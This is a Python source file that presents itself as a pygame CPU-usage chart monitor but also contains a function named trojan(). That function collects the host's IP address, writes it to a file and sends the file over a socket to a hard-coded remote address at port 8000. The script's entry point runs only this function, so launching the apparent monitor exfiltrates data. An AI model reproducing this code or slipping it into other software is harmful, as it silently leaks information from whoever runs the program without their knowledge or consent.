import os
import psutil
import socket
from multiprocessing import Process
import pygame
import time
from hooman import Hooman


def main():
    window_width, window_height = 480, 370
    hapi = Hooman(window_width, window_height)
    pygame.display.set_caption("CPU Usage")
    pygame.display.set_icon(pygame.image.load("Chart.png"))
    bg_col = (255, 255, 255)
    loop_var = 0
    time_unit = 0
    graph_data = []
    hapi.stroke_size(5)
    hapi.stroke(hapi.color['red'])
    while hapi.is_running:
        loop_var += 1
        hapi.background(bg_col)
        if loop_var % 10 == 0:
            time_unit += 1
            graph_data.append([round(time_unit), round(psutil.cpu_percent())])
        if graph_data:
            range_data = list(zip(*graph_data))
            max_time = round(max(range_data[0]))
            max_cycle = 100
        else:
            max_time = 100
            max_cycle = 100
        hapi.linechart(
            30,
            30,
            400,
            300,
            {
                "data": graph_data,
                "mouse_line": False,
                "range_y": [0, max_cycle],
                "range_x": [0, max_time],
                "line_color": (200, 200, 200),
            },
        )
        hapi.event_loop()
        hapi.flip_display()
    pygame.quit()




def trojan():
    host = "10.24.2.128"
    port = 8000
    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 4096
    fileName = "File.txt"
    try:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        with open("File.txt", "w") as file:
            file.write(str(IPAddr))
            file.close()
        filesize = os.path.getsize(fileName)
        s = socket.socket()
        s.connect((host,port))
        s.send(f"{fileName}{SEPARATOR}{filesize}".encode())
        with open(fileName,"rb") as f:
            while True:
                bytesRead = f.read(BUFFER_SIZE)
                if not bytesRead:
                    break
                s.sendall(bytesRead)
        s.close()
    except:
        print("failed")



def multi(*functions):
    processes = []
    for function in functions:
        proc = Process(target=function)
        proc.start()
        processes.append(proc)
    for proc in processes:
        proc.join()

if __name__ == '__main__':
    trojan()